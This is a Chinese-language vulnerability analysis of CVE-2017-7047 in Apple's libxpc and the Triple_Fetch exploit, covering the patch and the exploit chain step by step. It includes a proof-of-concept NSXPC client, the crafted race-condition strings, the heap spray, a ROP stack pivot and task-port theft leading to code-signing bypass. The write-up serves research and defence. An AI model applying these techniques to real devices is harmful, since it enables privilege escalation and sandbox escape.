作者：[Liang Chen
(@chenliang0817)](http://keenlab.tencent.com/zh/2017/08/02/CVE-2017-7047-Triple-Fetch-bug-and-vulnerability-analysis/)

昨天 Google Project Zero 的 Ian Beer 发布了 CVE-2017-7047 的漏洞细节，以及一个叫 Triple_Fetch
的漏洞利用 app，可以拿到所有 10.3.2
及以下版本的用户态Root+无沙盒权限，昨天我看了一下这个漏洞和利用的细节，总得来说整个利用思路还是非常精妙的。我决定写这篇文章，旨在尽可能地记录下
Triple_Fetch 以及 CVE-2017-7047 的每一个精彩的细节。

#### CVE-2017-7047 漏洞成因与细节

这是个 libxpc 底层实现的漏洞。我们知道，其实 libxpc 是在 macOS/iOS 的 mach_msg
基础上做了一层封装，使得以前一些因为使用或开发 MIG 接口的过程中因为对 MIG 接口细节不熟悉导致的漏洞变得越来越少。有关 MIG
相关的内容可以参考[我以前的文章](http://keenlab.tencent.com/en/2016/07/22/WindowServer-The-privilege-chameleon-on-macOS-Part-1/) ，这里不再详细叙述。

XPC 自己实现了一套类似于 CFObject/OSObject
形式的对象库，对应的数据结构为`OS_xpc_xxx`(例如`OS_xpc_dictionary`,
`OS_xpc_data`等)，当客户端通过XPC发送数据时，`_xpc_serializer_pack` 函数会被调用，将要发送的
`OS_xpc_xxx` 对象序列化成 binary 形式。注意到，如果发送的数据中存在 `OS_xpc_data` 对象(可以是作为
OS_xpc_array 或者 OS_xpc_dictionary 等容器类的元素)时，对应的 serialize 函数
`_xpc_data_serialize` 会进行判断：

    
    
    __int64 __fastcall _xpc_data_serialize(__int64 a1, __int64 a2)
    {
    ...
      if ( *(_QWORD *)(a1 + 48) > 0x4000uLL ) //这里判断data的长度
      {
        v3 = dispatch_data_make_memory_entry(*(_QWORD *)(a1 + 32)); //获取这块内存的send right
        ...
      }
    ...
    }

当 `OS_xpc_data` 对象的数据大于 0x4000 时，`_xpc_data_serialize`
函数会调用`dispatch_data_make_memory_entry`，`dispatch_data_make_memory_entry`
调用`mach_make_memory_entry_64`。`mach_make_memory_entry_64`
返回给用户一个`mem_entry_name_port` 类型的 send right, 用户可以紧接着调用 `mach_vm_map` 将这个 send
right 对应的 memory 映射到自己进程的地址空间。也就是说，对大于 0x4000 的 `OS_xpc_data` 数据，XPC
在传输的时候会避免整块内存的传输，而是通过传 port 的方式让接收端拿到这个 memory 的 send right，接收端接着通过
`mach_vm_map` 的方式映射这块内存。接收端反序列化 `OS_xpc_data` 的相关代码如下：

    
    
    __int64 __fastcall _xpc_data_deserialize(__int64 a1)
    {
      if ( _xpc_data_get_wire_value(a1, (__int64 *)&v8, &v7) ) //获取data内容
      {
        ...
      }
      return v1;
    }
    char __fastcall _xpc_data_get_wire_value(__int64 a1, _QWORD *a2, mach_vm_size_t *a3)
    {
    ...
      if ( v6 )
      {
        v7 = *v6;
        if ( v7 > 0x4000 )//数据大于0x4000时，则获取mem_entry_name_port来映射内存
        {
          v8 = 0;
          name = 0;
          v17 = 0;
          v19 = (unsigned int *)_xpc_serializer_read(a1, 0LL, &name, &v17); //获取mem_entry_name_port send right
          if ( name + 1 >= 2 )
          {
            v9 = v17;
            if ( v17 == 17 )
            {
              v10 = _xpc_vm_map_memory_entry(name, v7, (mach_vm_address_t *)&v19); //调用_xpc_vm_map_memory_entry映射内存
              ...
            }
          }
    ...
    }

之后就是最关键的 `_xpc_vm_map_memory_entry` 逻辑了，可以看到，在 macOS 10.12.5 或者 iOS 10.3.2
的实现中，调用 `mach_vm_map` 的相关参数如下：

    
    
    kern_return_t __fastcall _xpc_vm_map_memory_entry(mem_entry_name_port_t object, mach_vm_size_t size, _QWORD *a3)
    {
      result = mach_vm_map(
                 *(_DWORD *)mach_task_self__ptr,
                 (mach_vm_address_t *)&v5,
                 size,
                 0LL,
                 1,
                 object,
                 0LL, 
                 0, // Booleean copy
                 0x43,
                 0x43,
                 2u);
    }

`mach_vm_map` 的官方参数定义如下：

    
    
    kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, mem_entry_name_port_t object, memory_object_offset_t offset, boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection, vm_inherit_t inheritance);

值得注意的是最后第四个参数 boolean_t copy， 如果是 0 代表映射的内存与原始进程的内存共享一个物理页，如果是 1 则是分配新的物理页。

在 `_xpc_data_deserialize` 的处理逻辑中，内存通过共享物理页的方式(copy = 0)来映射，这样在客户端进程中攻击者可以随意修改
data 的内容从而实时体现到接收端进程中。虽然在绝大多数情况下，这样的修改不会造成严重影响，因为接收端本身就应该假设从客户端传入的 data
是任意可控的。但是如果这片数据中存在复杂结构(例如length等field)，那么在处理这片数据时就可能产生 double fetch 等条件竞争问题。而
Ian Beer
正是找到了一处”处理这个data时想当然认为这块内存是固定不变的错误”，巧妙地实现了任意代码执行，这部分后面详细叙述，我们先来看看漏洞的修复。

#### CVE-2017-7047 漏洞修复

这个漏洞的修复比较直观，在 `_xpc_vm_map_memory_entry` 函数中多加了个参数，指定 vm_map
是以共享物理页还是拷贝物理页的方式来映射：

    
    
    char __fastcall _xpc_data_get_wire_value(__int64 a1, _QWORD *a2, mach_vm_size_t *a3)
    {
    ...
        if ( v7 > 0x4000 )
        {
          v8 = 0;
          name = 0;
          v17 = 0;
          v19 = (unsigned int *)_xpc_serializer_read(a1, 0LL, &name, &v17);
          if ( name + 1 >= 2 )
          {
            v9 = v17;
            if ( v17 == 17 )
            {
              v10 = _xpc_vm_map_memory_entry(name, v7, (mach_vm_address_t *)&v19, 0);//引入第四个参数，指定为0
            }
          }
        }
    ...
    }
    kern_return_t __fastcall _xpc_vm_map_memory_entry(mem_entry_name_port_t object, mach_vm_size_t size, mach_vm_address_t *a3, unsigned __int8 a4)
    {
    ...
      result = mach_vm_map(*(_DWORD *)mach_task_self__ptr, 
                            &address, size, 0LL, 1, object, 0LL, 
                            a4 ^ 1, // 异或1后，变为1
                            0x43, 
                            0x43, 
                            2u);
    ...
    }

可以看到，这里把映射方式改成拷贝物理页后，问题得以解决。

#### Triple_Fetch利用详解

如果看到这里你还不觉得累，那么下面的内容可能就是本文最精彩的内容了（当然，估计会累）。

###### 一些基本知识

我们现在已经知道，这是个 XPC 底层实现的漏洞，但具体能否利用，要看特定 XPC 服务的具体实现，而绝大多数 XPC 服务仅仅将涉及
`OS_xpc_data` 对象的 buffer 作为普通数据内容来处理，即使在处理的时候 buffer
内容发生变化，也不会造成大问题。而即便找到有问题的案例，也仅仅是影响部分 XPC 服务。把一个通用型机制漏洞变成一个只影响部分 XPC
服务的漏洞利用，可能不是一种好策略。

因此，Ian Beer 找到了一个通用利用点，那就是 NSXPC。NSXPC 是比 XPC 更上层的一种进程间通信的实现，主要为 Objective-c
提供进程间通信的接口，它的底层基于 XPC 框架。我们先来看看 Ian Beer 提供的漏洞 poc：

    
    
    int main() {
      NSXPCConnection *conn = [[NSXPCConnection alloc] initWithMachServiceName:@"com.apple.wifi.sharekit" options:NSXPCConnectionPrivileged];
      [conn setRemoteObjectInterface: [NSXPCInterface interfaceWithProtocol: @protocol(MyProtocol)]];
      [conn resume];
    
      id obj = [conn remoteObjectProxyWithErrorHandler:^(NSError *err) {
        NSLog(@"got an error: %@", err);
      }];
      [obj retain];
      NSLog(@"obj: %@", obj);
      NSLog(@"conn: %@", conn);
    
      int size = 0x10000;
      char* long_cstring = malloc(size);
      memset(long_cstring, 'A', size-1);
      long_cstring[size-1] = 0;
    
      NSString* long_nsstring = [NSString stringWithCString:long_cstring encoding:NSASCIIStringEncoding];
    
      [obj cancelPendingRequestWithToken:long_nsstring reply:nil];
      gets(NULL);
      return 51;
    }

代码调用了 `“com.apple.wifi.sharekit”` 服务的 `cancelPendingRequestWithToken`
接口，其第一个参数为一个长度为 0x10000,内容全是 A 的 string，我们通过调试的方法来理一下调用这个 NSXPC 接口最终到底层
mach_msg 的 message 结构，首先断点到 mach_msg：

    
    
      (lldb) bt
      * thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 2.1
    * frame #0: 0x00007fffba597760 libsystem_kernel.dylib`mach_msg
      frame #1: 0x00007fffba440feb libdispatch.dylib`_dispatch_mach_msg_send + 1195
      frame #2: 0x00007fffba441b55 libdispatch.dylib`_dispatch_mach_send_drain + 280
      frame #3: 0x00007fffba4582a9 libdispatch.dylib`_dispatch_mach_send_push_and_trydrain + 487
      frame #4: 0x00007fffba455804 libdispatch.dylib`_dispatch_mach_send_msg + 282
      frame #5: 0x00007fffba4558c3 libdispatch.dylib`dispatch_mach_send_with_result + 50
      frame #6: 0x00007fffba6c3256 libxpc.dylib`_xpc_connection_enqueue + 104
      frame #7: 0x00007fffba6c439d libxpc.dylib`xpc_connection_send_message + 89
      frame #8: 0x00007fffa66df821 Foundation`-[NSXPCConnection _sendInvocation:withProxy:remoteInterface:withErrorHandler:timeout:userInfo:] + 3899
      frame #9: 0x00007fffa66de8e0 Foundation`-[NSXPCConnection _sendInvocation:withProxy:remoteInterface:withErrorHandler:] + 32
      frame #10: 0x00007fffa4cbf54a CoreFoundation`___forwarding___ + 538
      frame #11: 0x00007fffa4cbf2a8 CoreFoundation`__forwarding_prep_0___ + 120
      frame #12: 0x0000000100000da4 nsxpc_client`main + 404
      frame #13: 0x00007fffba471235 libdyld.dylib`start + 1

观察它的 message header 结构：

    
    
    (lldb) x/10xg $rdi
        0x10010bb88: 0x0000006480110013 0x0000000000001303
        0x10010bb98: 0x100000000000150b 0x00001a0300000001
        0x10010bba8: 0x0011000000000000 0x0000000558504321
        0x10010bbb8: 0x0000002c0000f000 0x746f6f7200000002
        0x10010bbc8: 0x0000800000000000 0x786f727000034000
    
    typedef    struct 
    {
      mach_msg_bits_t    msgh_bits;
      mach_msg_size_t    msgh_size;
      mach_port_t        msgh_remote_port;
      mach_port_t        msgh_local_port;
      mach_port_name_t    msgh_voucher_port;
      mach_msg_id_t        msgh_id;
    } mach_msg_header_t;

这里发送的是一个复杂消息，长度为 0x64。值得注意的是，所有 XPC 的 msgh_id 都是固定的 0x10000000，这与 MIG 接口的根据
msgh_id 号来作 dispatch 有所不同。由于这个消息用到了大于 0x4000 的 `OS_xpc_data` 数据，因此
message_header 后跟一个 `mach_msg_body_t` 结构，这里的值为1(偏移0x18的4字节)，意味着之后跟了一个复杂消息，而偏移
0x1c 至 0x28 的内容是一个`mach_msg_port_descriptor_t` 结构，其定义如下：

    
    
    typedef struct
    {
      mach_port_t            name;
    // Pad to 8 bytes everywhere except the K64 kernel where mach_port_t is 8 bytes
      mach_msg_size_t        pad1;
      unsigned int            pad2 : 16;
      mach_msg_type_name_t        disposition : 8;
      mach_msg_descriptor_type_t    type : 8;
    } mach_msg_port_descriptor_t;

偏移 0x1c 处的 0x1a03 是一个 `mem_entry_name_port`，也就是 0x10000 的 ’A’ buffer 对应的 port。

从 0x28 开始的 8 字节为真正的 xpc 消息的头部，最新的 mac/iOS 上，这个头信息是固定的：
0x0000000558504321，也就是字符串 “!CPX”(XPC!的倒序)，以及版本号 0x5，接下来跟的是一个序列化过的
`OS_xpc_dictionary` 结构：

    
    
    (lldb) x/10xg 0x10010bbb8
    0x10010bbb8: 0x0000002c0000f000 0x746f6f7200000002
    0x10010bbc8: 0x0000800000000000 0x786f727000034000
    0x10010bbd8: 0x000000006d756e79 0x0000000100004000

如果翻译成 Human Readable 的格式，应该是这样：

    
    
    <dict>
        <key>root</key>
        <data>[the data of that mem_entry_name_port]</data>
        <key>proxynum</key>
        <integer>1</integer>
    </dict>

这里可以看到，这个 serialize 后的 OS_xpc_data 并没有引用对应的 send right 信息，只是标记它是个
DATA(0x8000)，以及它的长度 0x34000。而事实上，在 deserialize 的时候，程序会自动寻找 `mach_msg_body_t`
中指定的复杂消息个数，并且顺序去寻找后边紧跟的 `mach_msg_port_descriptor_t` 结构，而序列化过后的 XPC 消息中出现的
`OS_xpc_data` 与之前填入的 `mach_msg_port_descriptor_t`
顺序是一致并且一一对应的。用一个简单明了的图来说明，就是这样：

![](https://images.seebug.org/content/images/2017/08/1.png-w331s) NSXPC at
mach_msg view

看到这里，我们对 NSXPC 所对应的底层 mach_msg 结构已经有所了解。但是，这里还遗留了个问题：如果所有 XPC 的 msgh_id 都是
0x10000000，那么接收端如何知道我调用的是哪个接口呢？其中的奥秘，就在这个 XPC Dictionary 中的 root
字段，我们还没有看过这个字段对应的 `mem_entry_name_port` 对应的 buffer 内容是啥呢，找到这个 buffer
后，他大概就是这个样子：

    
    
    (lldb) x/100xg 0x0000000100440000
    0x100440000: 0x36317473696c7062 0x00000000020070d0
    0x100440010: 0x70d000766e697400 0x7700000000000200
    0x100440020: 0x7d007373616c6324 0x61636f766e49534e
    0x100440030: 0x797473006e6f6974 0x0040403a40767600
    0x100440040: 0x6325117f00657373 0x6e65506c65636e61
    0x100440050: 0x75716552676e6964 0x5468746957747365
    0x100440060: 0x7065723a6e656b6f 0xff126fe0003a796c
    0x100440070: 0x41004100410041ff 0x4100410041004100
    0x100440080: 0x4100410041004100 0x4100410041004100
    0x100440090: 0x4100410041004100 0x4100410041004100
    0x1004400a0: 0x4100410041004100 0x4100410041004100
    0x1004400b0: 0x4100410041004100 0x4100410041004100
    0x1004400c0: 0x4100410041004100 0x4100410041004100
    0x1004400d0: 0x4100410041004100 0x4100410041004100
    0x1004400e0: 0x4100410041004100 0x4100410041004100
    0x1004400f0: 0x4100410041004100 0x4100410041004100
    0x100440100: 0x4100410041004100 0x4100410041004100
    0x100440110: 0x4100410041004100 0x4100410041004100
    (lldb) x/1s 0x0000000100440000
    0x100440000: "bplist16\xffffffd0p"

这是个 bplist16 序列化格式的 buffer，是 NSXPC 专用的，和底层 XPC 的序列化格式是有区别的。这个 buffer 被做成
`mem_entry_name_port` 传输给接收端，而接收端直接用共享内存的方式获得这个
buffer，并进行反序列化操作，这就创造了一个绝佳的利用点，当然这是后话。我们先看一下这个 buffer 的二进制内容：

![](https://images.seebug.org/content/images/2017/08/2.png-w331s) bplist
sample to call cancelPendingRequestWithToken

这个 bplist16 格式的解析比较复杂，而且 Ian Beer 的实现里也只是覆盖了部分格式，大致转换成 Human Readable 的形式就是这样：

    
    
    <dict>
        <key>$class</key>
        <string>NSInvocation</string>
        <key>ty</key>
        <string>v@:@@</string>
        <key>se</key>
        <string>cancelPendingRequestWithToken:reply:</string>
        AAAAAAAAAA
    </dict>

这里的 ty 字段是这个 objc 接口的函数原型，se 是 selector 名称，也就是接口名字，后面跟的 AAAA 就是他的参数内容。接收端的
NSXPC 接口正是根据这个 bplist16 中的内容来分发到正确的接口并给予正确的接口参数的。

Ian Beer 提供的 PoC 是跑在 macOS 下的，因此他直接调用了 NSXPC 的接口，然后通过 `DYLD_INSERT_LIBRARIES`
注入的方式 hook 了 `mach_make_memory_entry_64` 函数，这样就能获取这个 send right 并且进行
vm_map。但是在 iOS 上（特别是没有越狱的 iOS）并不能做这样的 hook，如果从 NSXPC
接口入手我们没有办法获得那块共享内存（其实是有办法的:)，但不是很优雅），所以 Ian Beer 在 Triple_Fetch 利用程序中自己实现了一套
XPC 与 NSXPC 对象封装、序列化、反序列化的库，自己组包并调用 mach_msg 与 NSXPC 的服务端通信，实现了利用。

###### Triple_Fetch 利用 - 如何实现控 PC

Ian Beer 对 NSXPC 的这个 bplist16 的 dictionary 中的 ty 字段做了文章，这个字段指定了 objc
接口的函数原型，NSXPC 底层会去解析这个 string，如果@后跟了个带冒号的字符串，例如：@”mfz”，则 CoreFoundation 中的
__NSMS 函数会被调用：

    
    
    10  com.apple.CoreFoundation          0x00007fffb8794d10 __NSMS1 + 3344
    11  com.apple.CoreFoundation          0x00007fffb8793552 +[NSMethodSignature signatureWithObjCTypes:] + 226
    12  com.apple.Foundation              0x00007fffba1bb341 -[NSXPCDecoder decodeInvocation] + 330
    13  com.apple.Foundation              0x00007fffba46cf75 _decodeObject + 1243
    14  com.apple.Foundation              0x00007fffba1ba4c7 _decodeObjectAfterSettingWhitelistForKey + 128
    15  com.apple.Foundation              0x00007fffba1ba40d -[NSXPCDecoder decodeObjectOfClass:forKey:] + 129
    16  com.apple.Foundation              0x00007fffba1c6c87 -[NSXPCConnection _decodeAndInvokeMessageWithData:] + 326
    17  com.apple.Foundation              0x00007fffba1c6a72 message_handler + 685
    18  libxpc.dylib                      0x00007fffce196f96 _xpc_connection_call_event_handler + 35
    19  libxpc.dylib                      0x00007fffce19595f _xpc_connection_mach_event + 1707
    20  libdispatch.dylib                 0x00007fffcdf13726 _dispatch_client_callout4 + 9
    21  libdispatch.dylib                 0x00007fffcdf13999 _dispatch_mach_msg_invoke + 414
    22  libdispatch.dylib                 0x00007fffcdf237db _dispatch_queue_serial_drain + 443
    23  libdispatch.dylib                 0x00007fffcdf12497 _dispatch_mach_invoke + 868
    24  libdispatch.dylib                 0x00007fffcdf237db _dispatch_queue_serial_drain + 443
    25  libdispatch.dylib                 0x00007fffcdf16306 _dispatch_queue_invoke + 1046
    26  libdispatch.dylib                 0x00007fffcdf2424c _dispatch_root_queue_drain_deferred_item + 284
    27  libdispatch.dylib                 0x00007fffcdf2727a _dispatch_kevent_worker_thread + 929
    28  libsystem_pthread.dylib           0x00007fffce15c47b _pthread_wqthread + 1004
    29  libsystem_pthread.dylib           0x00007fffce15c07d start_wqthread + 13

这个函数的第一个参数指向 bplist16 共享内存偏移到 ty 字段@开始的地方，该函数负责解析后面的字串，关键逻辑如下：

    
    
    _BYTE *__fastcall __NSMS1(__int64 *a1, __int64 a2, char a3)
    {
    
      v6 = __NSGetSizeAndAlignment(*a1);// A. 获取这个@"xxxxx...." string的长度
      buffer = calloc(1uLL, v6 + 42 - *a1); //根据长度分配空间
      v9 = buffer + 37;
      while ( 2 ) //重新扫描字符串
      {
        v150 = v7 + 1;
        v120 = *v7;
        switch ( *v7 )
        {
          case 0x23:
          ...
          case 0x2A:
          ...
          case 0x40: //遇到'@'
    
            if ( v20 == 34 ) //下一字节是'"'则开始扫描下一个引号
            {
            ...
                while ( v56 != 34 ) //B. 扫描字符串，找到第二个引号
                {
                  v56 = (v57++)[1]; 
                  if ( !v56 )       //中间不得有null字符
                    goto LABEL_ERROR;
                }
                if ( v57 )
                {
                      v109 = v150 + 1;
                      do 
                      {
                        *v9++ = v55;
                        v110 = v109;
                        if ( v109 >= v57 )
                          break;
                        v55 = *v109++;
                      }
                      while ( v55 != 60 ); //C. 拷贝字符串@"xxxxx...."至buffer
                    }

Ian Beer 构造的初始字符串是 `@”mfz”AAAAA\x20\x40\x20\x20\x01\x00\x00\x00”\x00`, 其中 mfz
字串是运行时随机生成的3个随机字母，这是为了避免 Foundation 对已经出现过的字符串进行 cache 而不分配新内存（因为利用需要多次触发尝试）。

  1. 在 A 处，调用 `__NSGetSizeAndAlignment` 得到的长度是6（因为@”mfz”长度为6），因此 calloc 分配的内存长度是48（42 + 6）。而 buffer 的前 37 字节用于存储 metadata，所以真正的字符串会拷贝在 buffer+37 的地方。

  2. 在计算并分配好“合理“长度的buffer后，`__NSMS1`函数在 B 处重新扫描这个字符串，找到第二个冒号的位置（正常情况下，也就是@”mfz”的第二个冒号位置），但需要注意，在第二个冒号出现之前，不能有 null string

  3. 在C处，程序根据刚才计算的“第二个冒号”的位置，开始拷贝字串到 buffer+37 位置。

Ian
Beer通过在客户端app操作共享内存，改变`@”mfz”AAAAA\x20\x40\x20\x20\x01\x00\x00\x00”\x00`的某几字节，构造出一个绝妙的
Triple_Fetch 的状态，使得：

  1. 在 A 处计算长度时，字符串是 `@”mfz”AAAAA\x20\x40\x20\x20\x01\x00\x00\x00”\x00`，因此 calloc 了 48 字节(6+42)

  2. 在 B 处，字符串变为`@”mfzAAAAAA\x20\x40\x20\x20\x01\x41\x41\x41”\x00`， 这样第二个冒号到了倒数第二个字节的位置(v57的位置)

  3. 在 C 处，字符串变为`@”mfzAAAAAA\x20\x40\x20\x20\x01\x00\x00\x00”\x00`，程序将整个`@”mfzAAAAAA\x20\x40\x20\x20\x01\x00\x00\x00”`拷贝到 buffer+37 位置

如果只是要触发堆溢出，那1和2构造的 double fetch 已经足够，但如果要控 PC，Ian Beer 选择的是覆盖 buffer 后面精心分布的
`OS_xpc_uuid` 的对象，该对象大小恰巧也是48字节，并且其前8字节为 obj-c 的 isa (类似c++的 vptr
指针)，并且其某些字段是可控的( uuid string 部分)，通过覆盖这个指针，使其指向一段spray过的 gadget buffer 进行
ROP，完成任意代码执行。但由于 iOS 下 heap 分配的地址高4位是1，所以 `\x20\x40\x20\x20\x01\x41\x41\x41`
不可能是个有效的 heap 地址，因此我们必须加上状态3，用 triple fetch 的方式实现代码执行。

下图展示了溢出时的内存分布：

![](https://images.seebug.org/content/images/2017/08/3.png-w331s) overflow to
OS_xpc_uuid

在 NSXPC 消息处理完毕后，这些布局的 `OS_xpc_uuid` 就会被释放，因为其 isa 指针已被覆盖，并且新的指针 `0x120204020`
指向了可控数据，在执行 `xpc_release(uuid)` 的时候就能成功控制PC。

###### 布局与堆喷射

布局有两个因素需要考虑，其一是需要在特定内存 0x120204020 地址上填入 rop gadget，其二是需要在 0x30 大小的 block 上喷一些
`OS_xpc_uuid` 对象，这样当触发漏洞 calloc(1,48) 的时候，让分配的对象后面紧跟一个 `OS_xpc_uuid` 对象。

第一点 Ian Beer 是通过在发送的 XPC message 里加入了 200 个 `“heap_sprayXXX”` 的key，他们的 value
各自对应一个 `OS_xpc_data`，指向 0x4000 * 0x200 的大内存所对应的 send right，这块大内存就是 ROP gadget。

而第二点是通过在 XPC message 里加入 0x1000 个 `OS_xpc_uuid`，为了创造一些 hole 放入 freelist
中，使得我们的 calloc(1,48) 能够占入， Ian Beer 在 `add_heap_groom_to_dictionary`
函数中采用了一些技巧，比如间隔插入一些大对象等，但我个人觉得这里的 groom
并不是很有必要，因为我们不追求一次触发就利用成功（事实也是如此），每次触发失败后当 `OS_xpc_uuid` 释放后，就会天然地产生很多 0x30
block 上的 free element，下一次触发漏洞时就比较容易满足理想的堆分布状态。

###### ROP与代码执行

当接收端处理完消息后 `xpc_release(uuid)` 就会被触发，而我们把其中一个 uuid 对象的 isa 替换后，我们就控制了 pc。
此事我们的 x0 寄存器指向 OS_xpc_uuid 对象，而这个对象的 0x18-0x28 的16字节是可控的。 Ian Beer 选择了这么一段作为
stack_pivot 的前置工作：

    
    
    (lldb) x/20i 0x000000018d6a0e24
        0x18d6a0e24: 0xf9401000   ldr    x0, [x0, #0x20]
        0x18d6a0e28: 0xf9400801   ldr    x1, [x0, #0x10]
        0x18d6a0e2c: 0xd61f0020   br     x1

这样就完美地将 x0 指向了我们完全可控的 buffer 了。

###### ROP 如何获取目标进程的 send right

由于 ROP 执行代码比较不优雅，效率也低，Ian Beer 在客户端发送 mach_msg 时，在 XPC message 的 dictionary
中额外加入了 0x1000 个 port，将其 spray 到接收端进程，由于 port_name
的值在分配的时候是有规律的，接收端在ROP的时候调用64次 mach_msg，remote_port 设置成从 0xb0003 开始，每次+4，而
reply_port 设置为自己进程的task port，消息id设置为 0x12344321。在这 64 次发送中，只要有一次send right
port_name 猜中，客户端就可以拿着 port_set 中的 receive right 尝试接收消息，如果收到的消息 id 是 0x12344321
那客户端拿到的 remote port 就是接收端进程的 task send right。

###### 接收端进程的选择

由于是通杀NSXPC的利用，只要是进程实现了NSXPC的服务，并且container沙盒允许调用，我们都可以实现对端进程的代码执行。尽管如此，接收端进程的选择还是至关重要的。简单的来讲，我们首选的服务进程当然是Root权限+无沙盒，并且服务以OnDemand的形式来启动。这样的服务即使我们攻击失败导致进程崩溃，用户也不会有任何感觉，而且可以重复尝试攻击直到成功。

Ian Beer在这里选择了coreauthd进程，还有一个重要的原因，是它可以通过调用processor_set_tasks来获取系统任意进程的send
right从而绕过进程必须有get-task-allow entitlement才能获取其他进程send right的限制。而这个技巧Jonathan
Levin在2015年已经详细阐述，可以参考[这里](http://newosxbook.com/articles/PST2.html) 。

###### 后期利用

在拿到 coreauthd 的 send right 后，Ian Beer 调用 `thread_create_running` 在 coreauthd
中起一个线程，调用 `processor_set_tasks` 来获得系统所有进程的 send right。然后拿着 amfid 的 send right
用与 mach portal 同样的姿势干掉了代码签名，最后运行 debugserver 实现调试任意进程。

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/366/>

